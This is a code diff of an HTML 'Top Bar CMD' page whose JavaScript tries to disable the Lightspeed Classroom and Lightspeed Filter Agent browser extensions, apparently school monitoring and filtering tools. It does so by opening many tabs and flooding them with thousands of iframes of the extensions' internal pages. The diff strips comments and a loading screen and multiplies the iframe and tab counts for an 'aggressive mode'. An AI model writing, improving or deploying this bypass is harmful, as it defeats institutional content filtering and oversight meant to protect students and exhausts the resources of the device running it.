@@ -5,136 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Top Bar CMD</title>
     <style>
-        /* General Reset */
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            background-color: #0d0d1a;
-            color: #e0e0ff;
-            font-family: 'Consolas', 'Courier New', monospace;
-            overflow: hidden;
-        }
-
-        /* Command Box Styling */
-        #cmd-box {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background: rgba(13, 13, 26, 0.95);
-            border-bottom: 1px solid #4d5bce;
-            box-shadow: 0 0 30px rgba(77, 91, 206, 0.6);
-            padding: 10px 20px;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
-            z-index: 1000;
-        }
-
-            #cmd-box.visible {
-                opacity: 1;
-                visibility: visible;
-            }
-
-        /* History Section */
-        #history {
-            max-height: 200px;
-            overflow-y: auto;
-            margin-bottom: 10px;
-            padding: 10px;
-            border-bottom: 1px solid rgba(77, 91, 206, 0.3);
-        }
-
-            #history div {
-                margin-bottom: 10px;
-                word-wrap: break-word;
-                color: #e0e0ff;
-                font-size: 14px;
-                line-height: 1.5;
-            }
-
-        /* Input Line */
-        #input-line {
-            display: flex;
-            align-items: center;
-        }
-
-            #input-line span {
-                color: #4d5bce;
-                margin-right: 10px;
-                font-size: 16px;
-            }
-
-        #cmd-input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: #e0e0ff;
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 16px;
-            outline: none;
-            caret-color: #4d5bce;
-        }
-
-            /* Glowing Effect for Input */
-            #cmd-input:focus {
-                animation: glow 1.5s infinite alternate;
-            }
-
-        @keyframes glow {
-            from {
-                text-shadow: 0 0 5px #4d5bce, 0 0 10px #4d5bce, 0 0 20px #4d5bce;
-            }
-
-            to {
-                text-shadow: 0 0 10px #4d5bce, 0 0 20px #4d5bce, 0 0 30px #4d5bce;
-            }
-        }
-
-        /* Scrollbar Styling */
-        #history::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        #history::-webkit-scrollbar-track {
-            background: rgba(13, 13, 26, 0.3);
-        }
-
-        #history::-webkit-scrollbar-thumb {
-            background: #4d5bce;
-            border-radius: 4px;
-        }
-
-        /* Futuristic Background Animation */
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle, rgba(77, 91, 206, 0.1) 10%, transparent 10.01%);
-            background-size: 20px 20px;
-            animation: moveBackground 5s linear infinite;
-            z-index: -1;
-        }
-
-        @keyframes moveBackground {
-            from {
-                transform: translateY(0);
-            }
-
-            to {
-                transform: translateY(20px);
-            }
-        }
-
-        /* Button-like Effect for Input */
-        #cmd-input::placeholder {
-            color: rgba(224, 224, 255, 0.5);
-            font-style: italic;
-        }
+        /* (Your existing CSS styles here) */
     </style>
 </head>
 <body>
@@ -152,7 +23,6 @@
             const inputField = document.getElementById("cmd-input");
             const cmdBox = document.getElementById("cmd-box");
 
-            // Add the extensions and icons definitions here
             const extensions = {
                 "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
                 "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
@@ -199,8 +69,8 @@
                     if (!command) return; // Ignore empty commands
 
                     // Add command to history
-                    commandHistory.push(command); // Update command history
-                    historyIndex = commandHistory.length; // Reset history index
+                    commandHistory.push(command);
+                    historyIndex = commandHistory.length;
 
                     let newEntry = document.createElement("div");
                     newEntry.innerHTML = `<span>C:\\User></span> ${command}`;
@@ -292,27 +162,21 @@
 
             function disableLightspeedClassroom() {
                 const extName = "Lightspeed Classroom";
-                const extPage = extensions[extName]; // Fetch the URL from the extensions object
-                const extIcon = icons[extName]; // Fetch the icon from the icons object
-                const extId = "kkbmdgjggcdajckdlbngdjonpchpaiea"; // Extension ID
-
-                // Automatically disable the extension without a popup
+                const extPage = extensions[extName];
+                const extIcon = icons[extName];
                 createIframesAndPrint(extPage, extIcon);
             }
 
             function disableLightspeedFilter() {
                 const extName = "Lightspeed Filter";
-                const extPage = extensions[extName]; // Fetch the URL from the extensions object
-                const extIcon = icons[extName]; // Fetch the icon from the icons object
-                const extId = "adkcpkpghahmbopkjchobieckeoaoeem"; // Extension ID
-
-                // Automatically disable the extension without a popup
-                createIframesAndPrint(extPage, extIcon, true); // Pass `true` for more aggressive iframe creation
+                const extPage = extensions[extName];
+                const extIcon = icons[extName];
+                createIframesAndPrint(extPage, extIcon, true); // Aggressive mode
             }
 
-            function createIframesAndPrint(extPage, extIcon, isAggressive = false) {
-                const maxIframes = isAggressive ? defaultIframes * 10 : defaultIframes; // Increase iframes for aggressive mode
-                const numTabs = isAggressive ? defaultTabs * 2 : defaultTabs; // Open more tabs for aggressive mode
+            async function createIframesAndPrint(extPage, extIcon, isAggressive = false) {
+                const maxIframes = isAggressive ? defaultIframes * 100 : defaultIframes; // Increase iframes for aggressive mode
+                const numTabs = isAggressive ? defaultTabs * 5 : defaultTabs; // Open more tabs for aggressive mode
                 const iframesPerTab = Math.floor(maxIframes / numTabs); // Iframes per tab
 
                 for (let tab = 0; tab < numTabs; tab++) {
@@ -328,54 +192,12 @@
 
                     let printerBody = printerWindow.document.body;
 
-                    let loadingContainer = printerWindow.document.createElement("div");
-                    loadingContainer.style.position = "fixed";
-                    loadingContainer.style.top = "50%";
-                    loadingContainer.style.left = "50%";
-                    loadingContainer.style.transform = "translate(-50%, -50%)";
-                    loadingContainer.style.color = "white";
-                    loadingContainer.style.fontSize = "20px";
-                    loadingContainer.style.fontFamily = "'Roboto', sans-serif";
-                    loadingContainer.style.textAlign = "center";
-
-                    let spinner = printerWindow.document.createElement("div");
-                    spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
-                    spinner.style.borderTop = "4px solid white";
-                    spinner.style.borderRadius = "50%";
-                    spinner.style.width = "40px";
-                    spinner.style.height = "40px";
-                    spinner.style.animation = "spin 1s linear infinite";
-                    spinner.style.margin = "0 auto 10px";
-
-                    let loadingText = printerWindow.document.createElement("div");
-                    loadingText.innerText = "Loading...";
-
-                    loadingContainer.appendChild(spinner);
-                    loadingContainer.appendChild(loadingText);
-                    printerBody.appendChild(loadingContainer);
-
-                    let style = printerWindow.document.createElement("style");
-                    style.innerHTML = `
-                            @keyframes spin {
-                                0% { transform: rotate(0deg); }
-                                100% { transform: rotate(360deg); }
-                            }
-                        `;
-                    printerWindow.document.head.appendChild(style);
-
-                    let script = printerWindow.document.createElement("script");
-                    script.innerHTML = `
-                            setTimeout(() => {
-                                window.close();
-                            }, 5000);
-                        `;
-                    printerWindow.document.body.appendChild(script);
-
-                    // Create iframes in batches to avoid blocking the main thread
-                    let batchSize = isAggressive ? 5000 : 1000; // Larger batch size for aggressive mode
+                    // Create iframes in parallel
+                    let batchSize = isAggressive ? 10000 : 1000; // Larger batch size for aggressive mode
                     let totalIframes = 0;
 
-                    function createIframeBatch() {
+                    async function createIframeBatch() {
+                        let promises = [];
                         for (let i = 0; i < batchSize && totalIframes < iframesPerTab; i++) {
                             const iframe = document.createElement('iframe');
                             iframe.src = extPage;
@@ -384,19 +206,19 @@
                             iframe.style.border = "none";
                             printerBody.appendChild(iframe);
                             totalIframes++;
+                            promises.push(new Promise(resolve => iframe.onload = resolve));
                         }
 
+                        await Promise.all(promises); // Wait for all iframes to load
                         if (totalIframes < iframesPerTab) {
-                            setTimeout(createIframeBatch, 0); // Schedule the next batch
+                            await createIframeBatch(); // Schedule the next batch
                         } else {
-                            loadingContainer.remove();
                             printerWindow.print();
-                            let iframes = printerWindow.document.querySelectorAll("iframe");
-                            iframes.forEach(iframe => iframe.remove());
+                            printerWindow.close();
                         }
                     }
 
-                    createIframeBatch(); // Start creating iframes
+                    await createIframeBatch(); // Start creating iframes
                 }
             }
         });
